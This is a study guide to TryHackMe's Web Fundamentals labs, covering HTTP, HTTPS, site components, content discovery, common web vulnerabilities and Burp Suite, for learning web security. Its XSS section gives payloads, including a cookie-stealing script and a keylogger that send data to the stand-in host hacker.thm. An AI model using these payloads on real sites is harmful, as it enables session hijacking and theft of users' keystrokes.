# Comprehensive Guide to Web Fundamentals

## Introduction

The Web Fundamentals lab series from TryHackMe provides a comprehensive introduction to understanding how the internet and web applications work from a security perspective. This series covers the basic concepts of the HTTP protocol, website components, content discovery methods, and common security vulnerabilities exploited by attackers.

This guide covers the following main sections:

    How The Web Works (DNS, HTTP, website components)

    Web Application Basics (HTML, CSS, JavaScript)

    Content Discovery and Application Enumeration

    Common Web Vulnerabilities (XSS, IDOR, SQL Injection, and more)

    Hacking Tools (Burp Suite)

Section 1: How The Web Works
1. HTTP Protocol in Detail

What is HTTP?

HTTP (HyperText Transfer Protocol) is the fundamental protocol used to transfer web content (HTML, images, videos) between the client (browser) and the server. It was developed by Tim Berners-Lee between 1989 and 1991.

HTTP Request Structure:

A typical HTTP request consists of the following parts:
http

GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/

Components of an HTTP Request:

    Request Line: Specifies the method (GET), path (/), and protocol version (HTTP/1.1)

    Host: Tells the server which website is being requested

    User-Agent: Identifies the browser type and version

    Referer: Indicates which page the user came from

    Blank Line: Indicates the end of the request

HTTP Response Structure:
http

HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>
<head>
<title>TryHackMe</title>
</head>
<body>
Welcome To TryHackMe.com
</body>
</html>

Components of an HTTP Response:

    Status Line: Protocol version, status code (200), and description (OK)

    Server: Identifies the web server type and version

    Content-Type: Specifies the type of content being sent (HTML, image, video, etc.)

    Content-Length: Specifies the response length to ensure no data loss

    Body: The actual content of the page (HTML, image, etc.)

Common HTTP Status Codes:

    100-199 (Informational): 100 Continue

    200-299 (Success): 200 OK, 201 Created

    300-399 (Redirection): 301 Moved Permanently, 302 Found

    400-499 (Client Errors): 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found

    500-599 (Server Errors): 500 Internal Server Error, 503 Service Unavailable

HTTP Methods:

    GET: Retrieve content from the server (used to load pages)

    POST: Send data to the server (used for login, forms)

    PUT: Create or replace a resource on the server

    DELETE: Delete a resource from the server

Important Note: HTTP is a stateless protocol, meaning each request is independent of others. To remember user state (like login status), cookies are used. Cookies are sent via the Set-Cookie header from the server and returned with each subsequent request via the Cookie header.
2. HTTPS - The Secure Version of HTTP

HTTPS is the encrypted version of HTTP using the SSL/TLS protocol. It provides:

    Confidentiality: Protects data from eavesdropping

    Integrity: Ensures data is not modified during transmission

    Authenticity: Confirms connection to the correct server

How HTTPS Works in Practice:

When visiting a site like google.com, the following occurs:

    Browser attempts HTTP connection (port 80)

    Server responds with 301 Redirect to www.google.com

    Browser intercepts the insecure request and attempts HTTPS (port 443) thanks to HSTS Preload

    A secure connection is established and server responds with 200 OK

Why HTTPS is Essential:

Without HTTPS, an attacker on a public Wi-Fi network can perform a Man-in-the-Middle (MITM) attack, intercepting the connection and displaying a fake version of the site to steal login credentials.
Section 2: Website Components
1. HTML (HyperText Markup Language)

HTML is a markup language used to create the structure of a web page. It defines various elements like headings, paragraphs, links, and images.
2. CSS (Cascading Style Sheets)

CSS is responsible for the appearance and visual aesthetics of the website. It controls colors, fonts, layout, and overall design.
3. JavaScript (JS)

JavaScript adds interactivity to web pages. It can handle user events (clicks, typing), send requests to the server without reloading the page (AJAX), and dynamically control page content.

Security Note: The source code of a page may contain sensitive information like credentials or developer comments that reveal vulnerabilities. Source code can be viewed by pressing Ctrl+U or using developer tools (F12).
Section 3: Content Discovery

Not all content on a website is publicly available. There may be admin pages, backup files, or hidden directories. These can be discovered through:
1. Manual Discovery

Robots.txt:

A file that tells search engines which pages should not be indexed. It provides testers with a list of pages the site doesn't want visitors to see.

Favicon:

The small icon that appears in the browser tab. Developers may keep the framework's default icon, which reveals the site's technology. The OWASP database can be used to identify the framework through the icon's MD5 Hash.

Sitemap.xml:

A file that lists all pages the site wants to be indexed by search engines. It may reveal hard-to-reach sections or old pages that still function.

HTTP Headers:

HTTP headers may reveal information about the server and its technologies.
2. Automated Discovery

Tools like Gobuster and Dirb are used to test thousands of common words to discover hidden directories and files on the server.
Section 4: Common Web Vulnerabilities
1. XSS (Cross-Site Scripting)

XSS is a vulnerability that allows attackers to inject malicious JavaScript code into web pages viewed by other users.

Types of XSS:

A. Reflected XSS:

Occurs when user-supplied data (like a URL parameter) is included in the web page without sanitization. The attacker sends a link containing the malicious payload to a potential victim.

B. Stored XSS:

The malicious payload is stored in the website's database (like a blog comment). Any user visiting the infected page will automatically execute the malicious code.

C. DOM-Based XSS:

Occurs when the page's JavaScript code interacts with user input (like window.location.hash) and writes untrusted content to the page without sanitization.

Common Payload Types:

    Proof of Concept: Demonstrate the vulnerability exists - <script>alert('XSS');</script>

    Session Stealing: Steal session cookies - <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

    Keylogger: Record keystrokes - <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

2. Other Vulnerabilities Covered in Advanced Sections

The Web Fundamentals path also covers other important vulnerabilities:

    IDOR (Insecure Direct Object Reference): Unauthorized access to objects by manipulating parameters in the URL (e.g., changing ?id=1 to ?id=2)

    SQL Injection: Injecting malicious SQL code into database queries

    File Inclusion: Including unwanted files on the server

    SSRF (Server-Side Request Forgery): Forcing the server to send requests to internal locations

    Command Injection: Executing operating system commands on the server

Section 5: Hacking Tools - Burp Suite

Burp Suite is a comprehensive platform for web application security testing. It provides tools such as:

    Proxy: Intercept and modify HTTP requests between browser and server

    Repeater: Manually resend modified requests and analyze responses

    Intruder: Automate dictionary attacks and fuzzing of parameters

    Decoder: Encode and decode data

    Extensions: Add additional functionality through plugins

Conclusion

The Web Fundamentals lab series from TryHackMe provides a solid foundation for understanding web applications from a security perspective. It covers:

Web Basics: DNS, HTTP/HTTPS, website components (HTML, CSS, JS)

Application Enumeration: Manual and automated content discovery, subdomain enumeration

Security Vulnerabilities: XSS, IDOR, SQL Injection, File Inclusion, SSRF, Command Injection

Tools: Burp Suite (Proxy, Repeater, Intruder)

This knowledge forms an essential foundation for anyone in cybersecurity, as understanding how web applications work and how they can be exploited is the first step toward protecting them effectively.
